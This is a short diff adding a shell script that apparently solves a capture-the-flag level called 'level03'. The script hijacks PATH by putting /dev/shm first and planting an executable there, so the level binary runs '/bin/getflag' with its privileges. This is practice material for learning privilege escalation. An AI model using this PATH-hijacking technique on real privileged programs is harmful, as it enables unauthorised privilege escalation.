@@ -1,0 +1,7 @@
+PATH=/dev/shm:/bin:/usr/bin
+
+echo "/bin/getflag" > /dev/shm/none
+
+chmod +x /dev/shm/none
+
+./level03
